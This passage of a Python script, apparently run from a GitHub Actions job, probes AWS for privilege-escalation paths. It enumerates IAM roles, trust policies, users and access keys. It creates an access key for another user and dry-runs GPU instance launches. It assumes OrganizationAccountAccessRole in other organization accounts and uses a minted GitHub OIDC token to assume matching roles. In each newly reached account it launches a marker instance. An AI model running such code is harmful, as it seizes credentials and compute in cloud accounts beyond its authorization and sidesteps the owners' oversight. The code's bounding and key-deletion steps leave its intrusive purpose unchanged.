    res['verdict'] = 'READY_DEVICE_UUID_PROVEN' if uuid else 'MARKER_NO_UUID'
    # leave the marker instance id + region on stderr for the wrapper
    say('C211_MARKER_ACCOUNT=%s REGION=%s INSTANCE=%s UUID=%s VERDICT=%s'
        % (account, chosen, iid, uuid or 'none', res['verdict']))
    return res


# ---------------------------------------------------------------- main
def main():
    out = {}
    cr0 = creds_env()
    ident = get_identity(cr0)
    account = ident.get('Account') or ''
    out['identity'] = json.dumps(ident)
    say('IDENTITY', out['identity'])
    ctx = {'account': account,
           'self_principals': set(),
           'oidc_arns': set(),
           'sub': '', 'aud': 'sts.amazonaws.com', 'repository': '', 'ref': '', 'workflow_ref': ''}
    if ident.get('Arn'):
        ctx['self_principals'].add(ident['Arn'])
        m = re.match(r'arn:aws:sts::(\d+):assumed-role/([^/]+)/', ident['Arn'])
        if m:
            ctx['self_principals'].add('arn:aws:iam::%s:role/%s' % (m.group(1), m.group(2)))
    ctx['self_principals'].add('arn:aws:iam::%s:root' % account)

    # 2) roles + full trust documents
    roles, rinfo = iam_list_roles(cr0)
    say('LISTROLES', json.dumps(rinfo), 'count=%d' % len(roles))
    trust = {}
    compact = []
    for r in roles[:400]:
        doc, gi = iam_get_role(cr0, r['RoleName'])
        trust[r['RoleName']] = doc if doc is not None else {'_get_role_error': gi}
        principals = set()
        conds = set()
        for st in (doc or {}).get('Statement', []) if isinstance(doc, dict) else []:
            pr = st.get('Principal')
            if isinstance(pr, dict):
                for k, v in pr.items():
                    for x in _as_list(v):
                        principals.add('%s:%s' % (k, cap(x, 90)))
            elif pr == '*':
                principals.add('*')
            for op, kv in (st.get('Condition') or {}).items():
                if isinstance(kv, dict):
                    for ck, cv in kv.items():
                        conds.add('%s/%s=%s' % (op, ck, cap(','.join(str(y) for y in _as_list(cv)[:3]), 90)))
        gh_pats, cls = [], 'NONE'
        for st in (doc or {}).get('Statement', []) if isinstance(doc, dict) else []:
            if str(st.get('Effect', '')).lower() != 'allow':
                continue
            pr0 = st.get('Principal')
            fed = _as_list((pr0 or {}).get('Federated')) if isinstance(pr0, dict) else []
            if not any('token.actions.githubusercontent.com' in str(x) for x in fed):
                continue
            subs = []
            for op, kv in (st.get('Condition') or {}).items():
                if isinstance(kv, dict):
                    for ck, cv in kv.items():
                        if ck.lower().endswith(':sub'):
                            subs.extend(str(x) for x in _as_list(cv))
            gh_pats.extend(subs)
        if gh_pats:
            if any(x.strip() == '*' for x in gh_pats):
                cls = 'ANY_SUBJECT'
            elif any(re.match(r'^repo:[^/]+/\*', x) or x.strip() == 'repo:*' for x in gh_pats):
                cls = 'ANY_REPO_IN_SCOPE:' + ','.join(gh_pats[:3])
            elif any(x.startswith('repo:') for x in gh_pats):
                cls = 'REPO_SCOPED'
            else:
                cls = 'OTHER_SUB'
        elif any('token.actions.githubusercontent.com' in p for p in principals):
            cls = 'GH_FED_NO_SUB_CONDITION(ANY)'
        compact.append({'role': r['RoleName'], 'path': r['Path'], 'gh_class': cls,
                        'gh_sub_patterns': gh_pats[:6],
                        'principals': sorted(principals)[:8], 'conditions': sorted(conds)[:8]})
        if gh_pats or 'GH_FED' in cls:
            say('C211_GHROLE %s class=%s patterns=%s' % (r['RoleName'], cls, ','.join(cap(x, 80) for x in gh_pats[:4])))
    out['roles_count'] = str(len(roles))
    out['roles_compact'] = json.dumps(compact)[:40000]
    blobs = {}
    for k, v in trust.items():
        s = json.dumps(v, sort_keys=True)
        if len(s) > 4000:
            s = s[:4000] + '...TRUNC'
        blobs[k] = s
    tm = json.dumps(blobs, sort_keys=True)
    out['trust_matrix'] = tm[:400000]
    out['trust_matrix_sha256'] = hashlib.sha256(tm.encode()).hexdigest()
    out['trust_matrix_bytes'] = str(len(tm))
    say('TRUST sha256=%s bytes=%d roles=%d' % (out['trust_matrix_sha256'], len(tm), len(trust)))

    # 3) OIDC providers
    arns, oinfo = iam_list_oidc(cr0)
    provs = [iam_get_oidc(cr0, a) for a in arns]
    ctx['oidc_arns'] = set(arns)
    out['oidc_providers'] = json.dumps(provs)[:12000]
    say('OIDC', json.dumps(oinfo), 'count=%d' % len(arns))

    # 3b) extended IAM surfaces: account summary, SAML providers, users + access-key
    #     metadata, per-role policy attachments, GetAccountAuthorizationDetails
    out['account_summary'] = json.dumps(iam_get_account_summary(cr0))[:4000]
    say('ACCT_SUMMARY', out['account_summary'][:900])
    saml = iam_list_saml(cr0)
    out['saml_providers'] = json.dumps(saml)[:9000]
    say('SAML', json.dumps({'status': saml['status'], 'code': saml.get('code'),
                            'count': len(saml['providers']),
                            'providers': [{'Arn': x['Arn'], 'get_status': x.get('get_status'),
                                           'metadata_bytes': x.get('metadata_bytes')}
                                          for x in saml['providers']]})[:1200])
    users, uinfo = iam_list_users(cr0)
    uk = []
    for u in users:
        keys, kinfo = iam_list_access_keys(cr0, u['UserName'])
        ap, _ = iam_list_attached_user_policies(cr0, u['UserName'])
        ip, _ = iam_list_user_policies(cr0, u['UserName'])
        uk.append({'UserName': u['UserName'], 'Arn': u['Arn'], 'CreateDate': u['CreateDate'],
                   'PasswordLastUsed': u['PasswordLastUsed'], 'keys': keys,
                   'attached': ap, 'inline': ip, 'keys_status': kinfo})
        say('IAM_USER', json.dumps(uk[-1])[:900])
    out['users'] = json.dumps({'status': uinfo, 'users': uk})[:16000]

    # 3b-bis) ONE bounded durable-credential attempt: iam:CreateAccessKey on e2e-test-user
    ck_rec, ck_creds = iam_create_access_key(cr0, 'e2e-test-user')
    say('CREATE_KEY', json.dumps(ck_rec)[:900])
    keyres = {'attempt': ck_rec}
    out['create_access_key'] = json.dumps(ck_rec)[:4000]
    if ck_creds:
        idk = get_identity(ck_creds)
        keyres['identity'] = idk
        say('KEY_IDENTITY', json.dumps(idk)[:600])
        q2 = [quota(ck_creds, code, reg) for code in ('L-DB2E81BA', 'L-3819A6DF')
              for reg in ('eu-west-2', 'eu-west-1')]
        keyres['quota'] = q2
        say('KEY_QUOTA', json.dumps(q2)[:1200])
        dry = signed('ec2', 'RunInstances',
                     {'ImageId': 'ami-00000000000000000', 'InstanceType': 'g5.xlarge',
                      'MinCount': '1', 'MaxCount': '1', 'DryRun': 'true'},
                     'eu-west-2', '2016-11-15', ck_creds)
        dryrec = {'status': dry['status'], 'code': err_code(dry), 'msg': cap(err_msg(dry), 500)}
        keyres['runinstances_dryrun'] = dryrec
        say('KEY_DRYRUN', json.dumps(dryrec)[:700])
        if dryrec['code'] == 'DryRunOperation':
            try:
                keyres['marker'] = marker_flow(ck_creds, account + ':e2e-test-user', REGION)
            except Exception as e:
                keyres['marker'] = {'error': repr(e)[:300]}
        else:
            keyres['marker'] = 'NOT_ATTEMPTED (RunInstances not permitted for this principal)'
        d = iam_delete_access_key(cr0, 'e2e-test-user', ck_creds['ak'])
        keyres['delete'] = d
        say('DELETE_KEY', json.dumps(d)[:500])
        keys_after, _ = iam_list_access_keys(cr0, 'e2e-test-user')
        keyres['keys_after'] = keys_after
        say('KEYS_AFTER', json.dumps(keys_after)[:600])
    out['durable_key'] = json.dumps(keyres)[:90000]
    rolepol = []
    for r in roles:
        ap, _ = iam_list_attached_role_policies(cr0, r['RoleName'])
        ip, _ = iam_list_role_policies(cr0, r['RoleName'])
        rolepol.append({'role': r['RoleName'], 'attached': ap, 'inline': ip})
    out['role_policies'] = json.dumps(rolepol)[:26000]
    authz = iam_authz_details(cr0)
    out['authz_details'] = json.dumps(authz)[:60000]
    say('AUTHZ', json.dumps({'pages': authz['pages'], 'users': len(authz['users']),
                             'groups': len(authz['groups']), 'roles': len(authz['roles']),
                             'policies': len(authz['policies']),
                             'status': authz['status'][:2]})[:600])

    # 3c) (a)-(e) trust classification with pushable-repo/owner join
    classes = classify_trusts(compact, account)
    out['trust_classes'] = json.dumps(classes)[:26000]
    say('TRUST_CLASSES', json.dumps(classes)[:2200])

    # 3d) Cognito identity pools referenced by trust conditions (unsigned GetId probe)
    cogn = sorted(set(re.findall(r'cognito-identity\.amazonaws\.com:aud=([A-Za-z0-9-]+:[0-9a-f-]+)',
                                 json.dumps(compact))))
    cogres = [cognito_getid(x) for x in cogn]
    out['cognito_pools'] = json.dumps(cogres)[:4000]
    for cr_ in cogres:
        say('COGNITO', json.dumps(cr_)[:300])

    # 4) organizations (authoritative: resolve the earlier ambiguous 404 verbatim)
    org = org_describe(cr0)
    out['organization'] = json.dumps(org)
    say('ORG', out['organization'][:900])
    if org.get('status') != 200:
        org2 = org_describe(cr0, host='organizations.amazonaws.com')
        out['organization_alt'] = json.dumps(org2)
        say('ORG_ALT', out['organization_alt'][:900])
        if org2.get('status') == 200:
            org = org2
            out['organization'] = json.dumps(org)
    out['org_parents'] = json.dumps(org_action(cr0, 'ListParents', {'ChildId': account}))[:1500]
    say('ORG_PARENTS', out['org_parents'])
    out['org_describe_account'] = json.dumps(org_action(cr0, 'DescribeAccount',
                                                        {'AccountId': account}))[:1500]
    say('ORG_DESCRIBE_ACCOUNT', out['org_describe_account'])
    new_accounts = []
    is_mgmt = str(org.get('MasterAccountId') or '') == account
    accts, ast = ([], [])
    if not is_mgmt:
        # bounded, read-only disambiguation of the earlier 404: ListAccounts succeeds
        # only for a management account, so a verbatim non-200 is authoritative
        accts, ast = org_list_accounts(cr0)
        out['list_accounts_speculative'] = json.dumps({'status': ast, 'accounts': accts})[:20000]
        say('LIST_ACCOUNTS_SPEC', json.dumps({'status': ast, 'accounts': len(accts)})[:600])
        if len(accts) > 0:
            is_mgmt = True
    if is_mgmt:
        if not accts:
            accts, ast = org_list_accounts(cr0)
        out['org_accounts'] = json.dumps({'status': ast, 'accounts': accts})[:20000]
        active = [a for a in accts if str(a.get('Status', '')).upper() == 'ACTIVE'
                  and a.get('Id') != account]
        say('ORG_ACCOUNTS', 'total=%d active_others=%d' % (len(accts), len(active)))
        attempts = []
        for a in active[:3]:
            arn = 'arn:aws:iam::%s:role/OrganizationAccountAccessRole' % a['Id']
            res = assume_role(cr0, arn)
            attempts.append({'account': a['Id'], 'name': a.get('Name'), 'role': arn,
                             'status': res['status'], 'code': res['code'],
                             'msg': cap(res['msg'], 300),
                             'assumed': res.get('assumed_arn')})
            say('ORG_ASSUME', json.dumps(attempts[-1])[:500])
            if res.get('creds'):
                new_accounts.append({'account': a['Id'], 'name': a.get('Name'),
                                     'via': 'OrganizationAccountAccessRole',
                                     'creds': res['creds'], 'arn': res.get('assumed_arn')})
        out['org_assume_attempts'] = json.dumps(attempts)[:12000]
    else:
        out['org_accounts'] = 'NOT_MANAGEMENT_ACCOUNT (DescribeOrganization MasterAccountId != self)'

    # 5) mint an id token and attempt the federated join
    tok, terr = get_github_id_token()
    attempts = []
    if tok:
        payload = jwt_payload(tok)
        ctx['sub'] = str(payload.get('sub') or '')
        ctx['aud'] = str(payload.get('aud') or 'sts.amazonaws.com')
        ctx['repository'] = str(payload.get('repository') or '')
        ctx['ref'] = str(payload.get('ref') or '')
        ctx['workflow_ref'] = str(payload.get('job_workflow_ref') or payload.get('workflow_ref') or '')
        out['id_token_claims'] = json.dumps({k: payload.get(k) for k in
                                             ('sub', 'aud', 'repository', 'ref', 'event_name',
                                              'job_workflow_ref', 'workflow', 'iss', 'exp')})[:2000]
        say('ID_TOKEN', out['id_token_claims'])
        for r in roles:
            doc = trust.get(r['RoleName'])
            if not isinstance(doc, dict):
                continue
            evals = []
            for st in (doc.get('Statement') or []):
                e = evaluate_statement(st, ctx)
                if e:
                    evals.append(e)
            feds = [e for e in evals if e['kind'] == 'federated' and e['matched']]
            dirs = [e for e in evals if e['kind'] == 'direct' and e['matched']]
            if feds:
                res = assume_role_with_web_identity(r['Arn'], tok)
                rec = {'role': r['RoleName'], 'arn': r['Arn'], 'via': 'AssumeRoleWithWebIdentity',
                       'status': res['status'], 'code': res['code'], 'msg': cap(res['msg'], 400),
                       'assumed': res.get('assumed_arn'), 'trust': feds[0].get('reason', '')[:400]}
                attempts.append(rec)
                say('WEBID_ASSUME', json.dumps(rec)[:600])
                if res.get('creds'):
                    _m = re.match(r'arn:aws:sts::(\d+):', res.get('assumed_arn') or '')
                    accid = _m.group(1) if _m else ''
                    if accid and accid != account:
                        new_accounts.append({'account': accid, 'via': 'webidentity:' + r['RoleName'],
                                             'creds': res['creds'], 'arn': res.get('assumed_arn')})
            elif dirs and ctx['account']:
                res = assume_role(cr0, r['Arn'])
                rec = {'role': r['RoleName'], 'arn': r['Arn'], 'via': 'AssumeRole',
                       'status': res['status'], 'code': res['code'], 'msg': cap(res['msg'], 300),
                       'assumed': res.get('assumed_arn'), 'trust': dirs[0].get('reason', '')[:300]}
                attempts.append(rec)
                say('DIRECT_ASSUME', json.dumps(rec)[:500])
        out['assume_attempts'] = json.dumps(attempts)[:20000]
    else:
        out['assume_attempts'] = 'NO_ID_TOKEN: ' + str(terr)
        say('ID_TOKEN_FAIL', str(terr))

    # 5b) explicit class-(c) cross-account sts:AssumeRole attempts (nonce session)
    cross = []
    for c in classes:
        if 'c' not in c['class']:
            continue
        arn = 'arn:aws:iam::%s:role/%s' % (account, c['role'])
        res = assume_role(cr0, arn)
        cross.append({'role': c['role'], 'arn': arn, 'status': res['status'],
                      'code': res['code'], 'msg': cap(res['msg'], 300),
                      'assumed': res.get('assumed_arn')})
        say('CROSS_ASSUME', json.dumps(cross[-1])[:500])
    out['cross_account_assume'] = json.dumps(cross)[:9000]

    # 6) per NEW access: identity + quota + exactly one marker
    seen = set()
    newd = []
    for na in new_accounts:
        if na['account'] in seen or len(newd) >= 3:
            continue
        seen.add(na['account'])
        cr = na['creds']
        idn = get_identity(cr)
        q = [quota(cr, code, reg) for code in ('L-DB2E81BA', 'L-3819A6DF')
             for reg in ('eu-west-2', 'us-east-1')]
        rec = {'account': na['account'], 'name': na.get('name'), 'via': na['via'],
               'assumed_arn': na.get('arn'), 'identity': idn, 'quota': q}
        say('NEW_ACCESS', json.dumps(rec)[:900])
        try:
            rec['marker'] = marker_flow(cr, na['account'], REGION)
        except Exception as e:
            rec['marker'] = {'error': repr(e)[:300]}
        newd.append(rec)
    out['new_accesses'] = json.dumps(newd)[:120000]
    kv = 'KEY_' + ('CREATED' if out.get('create_access_key') and
                   json.loads(out['create_access_key']).get('key_returned') else 'REFUSED')
    out['verdict'] = ('NEW_ACCESSES=%d' % len(newd)) if newd else ('NO_NEW_ACCOUNT_' + kv)
    say('VERDICT', out['verdict'])

    out['raw_tail'] = cap('\n'.join(RAW[-120:]), 12000)
    txt = json.dumps(out)
    sys.stdout.write(txt)
    sys.stdout.write('\n')
    return 0


if __name__ == '__main__':
    sys.exit(main())
